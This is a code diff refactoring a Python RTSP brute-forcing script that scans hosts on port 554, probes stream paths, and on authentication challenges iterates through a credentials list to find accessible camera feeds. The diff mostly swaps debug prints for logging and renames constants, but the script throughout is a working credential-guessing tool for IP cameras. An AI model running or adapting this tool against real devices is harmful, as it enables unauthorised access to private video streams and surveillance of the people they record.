@@ -1,34 +1,48 @@
 #!/usr/bin/env python
 from concurrent.futures import ThreadPoolExecutor, as_completed
-from lib.rtsp import get_auth_header_fn
+import logging
 import os
 from pathlib import Path
-from socket import SOL_SOCKET, SO_BINDTODEVICE, SocketIO, create_connection, setdefaulttimeout, socket, timeout
+from socket import (
+    SOL_SOCKET,
+    SO_BINDTODEVICE,
+    SocketIO,
+    create_connection,
+    setdefaulttimeout,
+    socket,
+    timeout,
+)
 from time import sleep, time
 
 from fire import Fire
 from tqdm import tqdm
 
+from lib.rtsp import get_auth_header_fn
 
-fake_path = '/i_am_network_researcher'
 
-work_dir = Path(os.path.dirname(os.path.abspath(__file__)))
+FAKE_PATH = '/i_am_network_researcher'
 
-data_dir = work_dir / 'data'
-local_dir = work_dir / 'local'
+WORK_DIR = Path(os.path.dirname(os.path.abspath(__file__)))
 
-paths_file = data_dir / 'rtsp_paths1.txt'
-creds_file = data_dir / 'rtsp_creds_my.txt'
+DATA_DIR = WORK_DIR / 'data'
+LOCAL_DIR = WORK_DIR / 'local'
 
-paths = [fake_path] + [ln.rstrip() for ln in open(paths_file)]
-creds = [ln.rstrip() for ln in open(creds_file)]
+LOG_FILE = LOCAL_DIR / 'rtsp_brute.log'
+PATHS_FILE = DATA_DIR / 'rtsp_paths1.txt'
+CREDS_FILE = DATA_DIR / 'rtsp_creds_my.txt'
+
+M_OPTIONS = 'OPTIONS'
+M_DESCRIBE = 'DESCRIBE'
+
+
+paths = [FAKE_PATH] + [ln.rstrip() for ln in open(PATHS_FILE)]
+creds = [ln.rstrip() for ln in open(CREDS_FILE)]
 
 cseqs = dict()
-debug = False
 
 
 def query(connection: socket, url: str = '*', headers: dict = {}) -> tuple[int, dict]:
-    method = 'OPTIONS' if url == '*' else 'DESCRIBE'
+    method = M_OPTIONS if url == '*' else M_DESCRIBE
 
     if url == '*':
         cseq = 0
@@ -53,16 +67,14 @@ def query(connection: socket, url: str = '*', headers: dict = {}) -> tuple[int, 
         '\r\n'
     ) % (method, url, cseq, headers_str)
 
-    if debug:
-        print('\n<< %s' % request.rstrip())
+    logging.info('\n<< %s' % request.rstrip())
 
     headers = {}
     try:
         connection.sendall(request.encode())
         response = connection.recv(1024).decode()
 
-        if debug:
-            print('\n>> %s' % response.rstrip())
+        logging.info('\n>> %s' % response.rstrip())
 
         if response.startswith('RTSP/'):
             _, code, _ = response.split(None, 2)
@@ -84,24 +96,19 @@ def query(connection: socket, url: str = '*', headers: dict = {}) -> tuple[int, 
     except KeyboardInterrupt:
         raise
     except BrokenPipeError as e:
-        if debug:
-            print(repr(e))
+        logging.error(repr(e))
         pass
     except timeout as e:
-        if debug:
-            print(repr(e))
+        logging.error(repr(e))
         pass
     except ConnectionResetError as e:
-        if debug:
-            print(repr(e))
+        logging.error(repr(e))
         pass
     except UnicodeDecodeError as e:
-        if debug:
-            print(repr(e))
+        logging.error(repr(e))
         pass
     except Exception as e:
-        if debug:
-            print(repr(e))
+        logging.error(repr(e))
         pass
 
     return 500, headers
@@ -119,27 +126,22 @@ def connect(host: str, port: int, interface: str = '') -> SocketIO:
     # for OSError, timeout handled only once
     while time() - start < 3:
         try:
-            if debug:
-                print('Conn to', host, port)
+            logging.info('Connecting to %s:%s' % (host, port))
             c = create_connection((host, port), 3)
             if interface:
                 c.setsockopt(SOL_SOCKET, SO_BINDTODEVICE, interface.encode())
-            if debug:
-                print('Connected to', host, port)
+            logging.info('Connected to %s:%s' % (host, port))
             return c
         except KeyboardInterrupt:
             raise
         except timeout as e:
-            if debug:
-                print(repr(e))
+            logging.error(repr(e))
             return
         except OSError as e:
-            if debug:
-                print(repr(e))
+            logging.error(repr(e))
             sleep(1)
         except Exception as e:
-            if debug:
-                print(repr(e))
+            logging.error(repr(e))
             return
 
 
@@ -171,9 +173,9 @@ def process_target(target_params) -> list[str]:
             #     return results
 
             if code == 200:
-                # if fake_path is ok,
+                # if FAKE_PATH is ok,
                 # root path will be ok too
-                if path == fake_path:
+                if path == FAKE_PATH:
                     url = get_url(host, port, '/')
 
                 results.append(url)
@@ -183,18 +185,17 @@ def process_target(target_params) -> list[str]:
 
                 continue
 
-            # auth 4 fake path is bad idea,
-            # so trying another path
-            if path == fake_path:
+            if path == FAKE_PATH:  # no auth for fake path
                 continue
 
             if code == 401:
+                # TODO: mv that to lower abstraction level
                 auth_fn = get_auth_header_fn(headers)
 
                 # bruteforcing creds
                 for cred in creds:
                     url = get_url(host, port, path)
-                    auth_headers = auth_fn('DESCRIBE', url, *cred.split(':'))
+                    auth_headers = auth_fn(M_DESCRIBE, url, *cred.split(':'))
                     code, headers = query(connection, url, auth_headers)
 
                     if code >= 500:
@@ -208,16 +209,17 @@ def process_target(target_params) -> list[str]:
 
                 # if no one cred accepted,
                 # we have no cred for another paths i think
-                break
+                if not results:
+                    break
 
     return results
 
 
 def main(H='', w=None, sp=False, i='', d=False):
-    global debug
-    debug = d
+    logging.basicConfig(filename=LOG_FILE,
+                        level=logging.INFO if d else logging.CRITICAL)
     results = []
-    hosts_file_path = H or local_dir / 'hosts_554.txt'
+    hosts_file_path = H or LOCAL_DIR / 'hosts_554.txt'
 
     setdefaulttimeout(3)
 
